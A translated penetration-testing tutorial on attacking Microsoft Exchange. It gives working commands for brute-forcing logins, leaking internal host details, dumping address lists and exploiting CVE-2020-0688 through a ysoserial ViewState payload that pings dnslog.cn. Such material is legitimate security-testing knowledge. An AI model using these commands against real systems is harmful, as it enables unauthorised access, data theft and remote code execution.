# 渗透测试中的Exchange
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
作者：daiker[@360Linton](https://github.com/360Linton "@360Linton")-Lab
## 0x00 前言
在渗透测试过程中,Exchange是一个比较奇妙的角色.
一方面,Exchange在外网分布很广,是外网打点人员进入内网的一个重要渠道.
另外一方面,Exchange在域内有着重要的地位,一般来说,拿到Exchange服务器的权限,基本等同于拿到域管的权限.因此他又是内网选手重点关注对象.
本文将总结部分Exchange已知的特性以及漏洞.
没有Exchange凭据的情况,主要有
  1. 爆破
  2. 泄露内网信息
  3. 配合钓鱼进行NTLM_Relay
有Exchange凭据的情况下,主要有
  1. 导出邮箱列表
  2. Exchange RCE漏洞
  3. Exchange SSRF 进行NTLM_Relay
  4. 使用hash/密码 操作EWS接口
  5. 攻击outlook客户端
  6. 从Exchange到域管
以下详细说明
## 0x01 爆破
在外网,看到开着Exchange,出现如下界面,我们可能第一反应就是爆破.
出现上面那种还好,burp拦截下,爆破开始
但是在渗透过程中,经常出现以下这种情况
对于这种情况,我们无需绕过验证码即可进行爆破.
事实上,除了上面那个界面之外,以下接口都可进行爆破,而且支持Basic认证方式.
    /ecp,/ews,/oab,/owa,/rpc,/api,/mapi,/powershell,/autodiscover,/Microsoft-Server-ActiveSync
这里推荐使用这款工具,他能寻找可以爆破的接口,从而进行爆破
    python EBurst.py -L users.txt -p 123456abc -d mail.xxx.com
有个需要注意的点就是这款工具不支持自签名证书,我们手动改下,忽略证书错误就行
## 0x02 泄露内网信息
###  1\. 泄露Exchange服务器内网IP 地址
把HTTP协议版本修改成1.0，然后去掉http头里面的HOST参数 或者使用msf
`auxiliary/scanner/http/owa_iis_internal_ip`
可用以匹配的接口列表有
    /Microsoft-Server-ActiveSync/default.eas
    /Microsoft-Server-ActiveSync
    /Autodiscover/Autodiscover.xml
    /Autodiscover
    /Exchange
    /Rpc
    /EWS/Exchange.asmx
    /EWS/Services.wsdl
    /EWS
    /ecp
    /OAB
    /OWA
    /aspnet_client
    /PowerShell
有两个坑点
  * 如果测试的是文件夹,后面没加`/`,比如`/owa`,有些环境会重定向到`/owa/`,可能导致无法获取到IP
  * msf的脚本里面限定了内网IP范围,如果企业是自定义的内网IP,可能无法获取到IP([代码](https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/http/owa_iis_internal_ip.rb#L79))
###  2\. 泄露Exchange服务器操作系统,主机名,Netbios名
由于支持ntlm认证,在文章[利用ntlm进行的信息收集](https://daiker.gitbook.io/windows-protocol/ntlm-pian/4#2-li-yong-ntlm-jin-hang-de-xin-xi-shou-ji)里面已经讲过
>
> 在type2返回Challenge的过程中，同时返回了操作系统类型，主机名，netbios名等等。这也就意味着如果我们给服务器发送一个type1的请求，服务器返回type2的响应，这一步，我们就可以得到很多信息。
因此我们可以获取很多信息了,这里使用nmap进行扫描
    sudo nmap MAIL  -p 443 --script http-ntlm-info --script-args http-ntlm-info.root=/rpc/rpcproxy.dll
## 0x03 导出邮箱列表
###  1\. 使用ruler
    ruler_windows_amd64.exe --insecure --url https://MAIL/autodiscover/autodiscover.xml  --email PI:EMAIL -u daiker -p 密码 --verbose --debug abk dump -o list.txt
###  2\. 使用MailSniper.ps1
    Get-GlobalAddressList -ExchHostname MAIL -UserName CORP\daiker -Password 密码 -OutFile global-address-list.txt
###  3\. 使用burp
登录exchange owa,右上角点击人员，左侧所有人员，抓包  
一个POST类型的包  
POST /owa/service.svc?action=FindPeople&ID=-34&AC=1  
Body中有这个字段
默认是80
然后查看响应包，拉到最后
这个是总的邮箱数
然后把80 改成这个数，直接发，就是邮箱数，但是有点多,burp容易卡死。可以这样
右键copy as request(这一步需要装插件)
然后复制到python文件里面
后面的内容改下
本来最后一行是
    requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
改成
    r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    j = r.json()
    results = j.get('Body').get('ResultSet')
    import json
    print(json.dumps(results))
然后运行python
    python 1.py | jq '.[].EmailAddresses[0].EmailAddress' -r|sort|uniq|
这样就提取出所有的邮箱
###  4\. 使用impacket底下的exchanger.py
今年5月份刚更新的一个脚本
    python exchanger.py DOMAIN/daiker:密码@MAIL nspi list-tables
    python exchanger.py DOMAIN/daiker:密码@MAIL nspi dump-tables  -guid xxxx
###  5\. 通过OAB
(1) 读取Autodiscover配置信息,获取OABUrl
    POST /autodiscover/autodiscover.xml HTTP/1.1
    Host: MAIL
    Accept-Encoding: gzip, deflate
    Accept: */*
    Authorization: Basic YmllamllbGU=
    Accept-Language: en
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
    Connection: close
    Content-Type: text/xml; charset=utf-8
    Content-Length: 355
    PI:EMAIL
    http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a
(2) 读取OAB文件列表
`OABUrl/oab.xml`
(3) 下载lzx文件
`OABUrl/xx.lzx`
(4) 对lzx文件解码，还原出Default Global Address List
Kali下直接使用的版本下载地址：
    ./oabextract 67a0647b-8218-498c-91b4-311d4cabd00c-data-1315.lzx gal.oab
    strings gal.oab|grep SMTP
## 0x04 RCE 漏洞
网上一搜Exchange的RCE漏洞还挺多的,但是在实际渗透中,只需要一个普通用户凭据,不需要其他条件的,主要有CVE-2020-0688和CVE-2020-17144
###  CVE-2020-0688
在拿到一个普通用户凭据情况下的RCE,Exchange2010没有开箱即用的POC
静态的密钥有
    validationkey = CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF
    validationalg = SHA1
我们要构造ViewState还需要`viewstateuserkey`和`__VIEWSTATEGENERATOR`
`viewstateuserkey`就是用户的`ASP.NET_SessionId`，在cookie 底下
`__VIEWSTATEGENERATOR`是一个隐藏字段。可以这样获取
    document.getElementById("__VIEWSTATEGENERATOR").value
现在我们已经有了`validationkey`,`validationalg`,`viewstateuserkey`,`__VIEWSTATEGENERATOR`。就可以用使用YSoSerial.net生成序列化后的恶意的ViewState数据。
    ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "ping dnslog.cn" --validationalg="SHA1" --validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" --generator="{填入__VIEWSTATEGENERATOR}" --viewstateuserkey="{填入viewstateuserkey，也就是ASP.NET_SessionId}" --isdebug –islegacy
然后构造URL
    /ecp/default.aspx?__VIEWSTATEGENERATOR={填入__VIEWSTATEGENERATOR}&__VIEWSTATE={填入YSoSerial.net生成的urlencode 过的ViewState}
浏览器访问就行
也可以直接使用头像哥的工具
检测
    ExchangeDetect   
利用
    ExchangeCmd   
    sub commands:
        exec  [args]
          exec command
        arch
          get remote process architecture(for shellcode)
        shellcode 
          run shellcode